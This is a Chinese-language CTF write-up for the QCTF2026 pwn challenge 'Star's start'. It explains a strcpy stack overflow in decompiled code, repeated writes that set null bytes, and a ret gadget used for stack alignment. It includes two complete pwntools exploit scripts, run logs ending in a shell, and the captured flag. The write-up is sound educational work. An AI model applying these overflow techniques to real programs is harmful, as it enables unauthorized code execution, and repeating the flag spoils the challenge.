---
title: Star's start（QCTF2026 pwn）
date: 2026-10-21
category: Pwn
tags:
  - CTF
  - Writeup
  - pwn
draft: false
summary: "ret2win，我要知道strings in C"
collection: QCTF2026
---
# Star's start

## 第一节：题目

ret2win，我要知道strings in C
## 第二节：过程

首先我们先玩一下
```bash
Oh!!! The star of pwn is coming.
Let's start with an easy ret2win. I believe that you can get it!
To get the flag, you need to know about the functions of strings in C.
what do you want to do?
1:give a name
2:change the name
3:start to pwn
>1
1

What name are you planning to change to?
what do you want to do?
1:give a name
2:change the name
3:start to pwn
>2
2

What name are you planning to choose?
what do you want to do?
1:give a name
2:change the name
3:start to pwn
>3
3

Where is the stack overflow?
Please input a number
Good job!
```
看作者给的提示，easy ret2win 目标是把返回地址改成 win
而 you need to know about the functions of strings in C 告诉我们我们需要知道 strcpy
之后我们打开IDA，发现有一个main函数和一个win函数，我们不妨先看一下win函数。
```c
void win()
{
  puts(s: "You win?");
  puts(s: "If you fail to get shell, you'd better know about the balance of stack");
  system(command: "/bin/sh");
}
```
我们看到了win函数它调用了system("/bin/sh")
但是我猜测就算跳转到了win还会有一关，因为If you fail to get shell, you'd better know about the balance of stack，好像说是栈对齐，不过这得先让我把返回地址改到win这里再说
所以我们的目标就很明确了，先把返回地址改成win，然后之后再看看究竟有没有下一关
我们刚刚才分析了win函数，还没有分析main，我们来看看main到底是个什么东西
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf3[8]; // [rsp+0h] [rbp-90h] BYREF
  __int64 v5; // [rsp+8h] [rbp-88h]
  __int64 v6; // [rsp+10h] [rbp-80h]
  __int64 v7; // [rsp+18h] [rbp-78h]
  __int64 v8; // [rsp+20h] [rbp-70h]
  __int64 v9; // [rsp+28h] [rbp-68h]
  char word[16]; // [rsp+30h] [rbp-60h] BYREF
  __int64 buf2; // [rsp+40h] [rbp-50h]
  __int64 v12; // [rsp+48h] [rbp-48h]
  __int64 v13; // [rsp+50h] [rbp-40h]
  __int64 v14; // [rsp+58h] [rbp-38h]
  __int64 v15; // [rsp+60h] [rbp-30h]
  __int64 v16; // [rsp+68h] [rbp-28h]
  __int64 v17; // [rsp+70h] [rbp-20h]
  __int64 v18; // [rsp+78h] [rbp-18h]
  char choice[4]; // [rsp+88h] [rbp-8h] BYREF
  int a; // [rsp+8Ch] [rbp-4h]

  buf2 = 0;
  v12 = 0;
  v13 = 0;
  v14 = 0;
  v15 = 0;
  v16 = 0;
  v17 = 0;
  v18 = 0;
  strcpy(word, "I will pwn you!");
  *(_QWORD *)buf3 = 0;
  v5 = 0;
  v6 = 0;
  v7 = 0;
  v8 = 0;
  v9 = 0;
  setvbuf(stream: stdin, buf: nullptr, modes: 2, n: 0);
  setvbuf(stream: stdout, buf: nullptr, modes: 2, n: 0);
  puts(s: "Oh!!! The star of pwn is coming.");
  puts(s: "Let's start with an easy ret2win. I believe that you can get it!");
  puts(s: "To get the flag, you need to know about the functions of strings in C.");
  do
  {
    menu();
    fgets(s: choice, n: 4, stream: stdin);
    a = atoi(nptr: choice);
    if ( a == 3 )
    {
      puts(s: "Where is the stack overflow?");
    }
    else if ( a <= 3 )
    {
      if ( a == 1 )
      {
        puts(s: "What name are you planning to change to?");
        read(fd: 0, buf: name, nbytes: 0x150u);
        strcpy(dest: buf3, src: name);
        continue;
      }
      if ( a == 2 )
      {
        puts(s: "What name are you planning to choose?");
        read(fd: 0, buf: name, nbytes: 0x40u);
        continue;
      }
    }
    puts(s: "Please input a number");
  }
  while ( a != 3 );
  if ( strcmp(s1: word, s2: "I will pwn you!") != 0 )
  {
    puts(s: "You break my word.............");
    exit(status: 0);
  }
  puts(s: "Good job!");
  return 0;
}
```
注意到当a=1的时候有溢出
```c
        read(fd: 0, buf: name, nbytes: 0x150u);
        strcpy(dest: buf3, src: name);
```
因为strcpy(dest, src)签名里唯一停写的条件是src遇到\0，而没有对dest做限制，所以只要让src比dest长，就会写穿
首先read不会在name后面加\0，而name没有被写过的地方本来就是0，所以我发送0xA0字节，name[0xA0]仍然是0，而这里面的字节由我自己控制，但是dest的实际容量就只有0x90，所以name多的字节不管dest装不装的下，buf3的结构是这样的
```
buf3 (rbp-0x90)
  +0x00  ┌────────────────┐
         │   dst 区域      │
  +0x30  │  word          │ ← "I will pwn you!"
         │                │
  +0x90  ├────────────────┤
         │  saved rbp     │
  +0x98  ├────────────────┤
         │  saved RIP     │ ← 目标
  +0xA0  └────────────────┘

```
不过main里面还有一关
```c
 if ( strcmp(s1: word, s2: "I will pwn you!") != 0 )
  {
    puts(s: "You break my word.............");
    exit(status: 0);
```
这个word在buf3+0x30的位置，刚刚好挡住了，我们改的时候不能把word也改了，所以写的时候要保留word，不过这个strcmp只在最后的时候校验，我们可以先在前面正常地把地址都覆盖成AAAA然后等最后一趟的时候再把它修回去，这样就可以了
多的字节我们发现会一直到返回地址这里，这样如果我们把多到返回地址里的字节给改成win函数，这样就返回到了win，但是直接写'A'×0x98 + p64(0x4014cb) 还是不行，因为0x4014cb有5个00，但是strcpy遇到0就停了，而这个时候我们就要用到我们之前的提示了：strcpy 会把终止符\x00一起拷过去，有个办法就是多调用几次strcpy就行了，不过为什么可以循环调用呢？因为a == 1后面是continue，只要a != 3，就可以一直改，直到 a== 3了之后才会跳出循环
这一关就算是过去了
```python
from pwn import *
import sys

io = remote(sys.argv[1], int(sys.argv[2]))
win = 0x4014cb
word = b"I will pwn you!"
A = lambda n: b"A" * n

seq = [
    A(0x9F) + b"\0", A(0x9E) + b"\0", A(0x9D) + b"\0", A(0x9C) + b"\0",   # 高位钉零
    A(0x98) + p32(win)[:3] + b"\0",                                     # 返回地址=win
    A(0x30) + word + b"\0",                                          # 最后把word放回去
]

io.recvuntil(b">")
for pl in seq:
    io.send(b"1\n")
    io.recvuntil(b"change to?")
    io.send(pl + b"\n")
    io.recvuntil(b">")

io.send(b"3\n")
print(io.recvrepeat(3).decode())


```
虽然但是之前win的伏笔在这里回收了
```bash
[x] Opening connection to nc1.ctfplus.cn on port 20814
[x] Opening connection to nc1.ctfplus.cn on port 20814: Trying 43.248.116.26
[+] Opening connection to nc1.ctfplus.cn on port 20814: Done
3
Where is the stack overflow?
Please input a number
Good job!
You win?
If you fail to get shell, you'd better know about the balance of stack
timeout: the monitored command dumped core
```
好消息是我们到了win，坏消息是我们没有拿到shell

我们现在回过头来看看
![](/assets/posts/qctf2026/qctf2026-pwn-stars-start-1.png)
main函数是以ret形式把控制权转移的而不是call，call会压8字节发返回地址都是ret
可能刚刚了解ret和call不知道区别在哪里，我也是问了DS老师好久才大概理解了。
call是
```asm
push rip_next
jmp taeget
```
也就是把下一条指令的地址压栈了之后，RSP -= 8
而ret
```asm
pop rip
jmp rip
```
是从RSP弹出地址到RIP，RSP += 8
也就是说，call是8字节入栈之后跳转，而ret是8字节出栈之后跳转！
对齐单位是16字节，ret一次只移动了8字节，那简单，我们移动两次就可以对齐。为什么是两次？因为我们现在因为没有拿到shell，说明我们在用了一次ret的情况下，到了错误的那一半，我们只要再ret一次，就到了正确的那一半
用法是cmd      python de.py host port
```python
from pwn import *
import sys

io = remote(sys.argv[1], int(sys.argv[2]))

WIN  = 0x4014cb          # win地址
RET  = 0x40148d          # main 自己那条 ret，埋下伏笔
SENT = b"I will pwn you!"   # 就是word

payloads = []

#4个0x00每次一个
payloads.append(b"A" * 0xA7 + b"\x00")
payloads.append(b"A" * 0xA6 + b"\x00")
payloads.append(b"A" * 0xA5 + b"\x00")
payloads.append(b"A" * 0xA4 + b"\x00")
#低3字节不变，第4个0由 strcpy 的终止符补
payloads.append(b"A" * 0xA0 + p32(WIN)[:3] + b"\x00")

#ret放在buf3+0x98
payloads.append(b"A" * 0x9F + b"\x00")
payloads.append(b"A" * 0x9E + b"\x00")
payloads.append(b"A" * 0x9D + b"\x00")
payloads.append(b"A" * 0x9C + b"\x00")
payloads.append(b"A" * 0x98 + p32(RET)[:3] + b"\x00")

#然后最后一轮只写到0x3F然后把word放回去
payloads.append(b"A" * 0x30 + SENT + b"\x00")

print("一共", len(payloads), "次")

io.recvuntil(b">")
for i, p in enumerate(payloads):
    io.send(b"1\n")
    io.recvuntil(b"change to?")
    io.send(p + b"\n")
    io.recvuntil(b">")
    print("这是第", i + 1, "次完成")

io.send(b"3\n")
io.interactive()
```

然后就拿到shell了
```bash
Z:\laragon\ctf\challenges\Qctf\PWN\05>py -3.12 de.py nc1.ctfplus.cn 20814
[x] Opening connection to nc1.ctfplus.cn on port 20814
[x] Opening connection to nc1.ctfplus.cn on port 20814: Trying 43.248.116.26
[+] Opening connection to nc1.ctfplus.cn on port 20814: Done
一共 11 次
这是第 1 次完成
这是第 2 次完成
这是第 3 次完成
这是第 4 次完成
这是第 5 次完成
这是第 6 次完成
这是第 7 次完成
这是第 8 次完成
这是第 9 次完成
这是第 10 次完成
这是第 11 次完成
[*] Switching to interactive mode
3
Where is the stack overflow?
Please input a number
Good job!
You win?
If you fail to get shell, youd better know about the balance of stack
$ ls -la
ls -la
total 92
drwxr-xr-x 1 root root  4096 Sep 21 09:39 .
drwxr-xr-x 1 root root  4096 Mar 30  2026 ..
-rw-r--r-- 1 root root    43 Oct 26 03:12 flag
-rwxr-xr-x 1 root root 71368 Sep 21 09:39 pwn
$ cat flag
cat flag
flag{11245e27-3d7b-4ce3-9dd1-4fbfefef1dec}
```
复现flag
`flag{11245e27-3d7b-4ce3-9dd1-4fbfefef1dec}`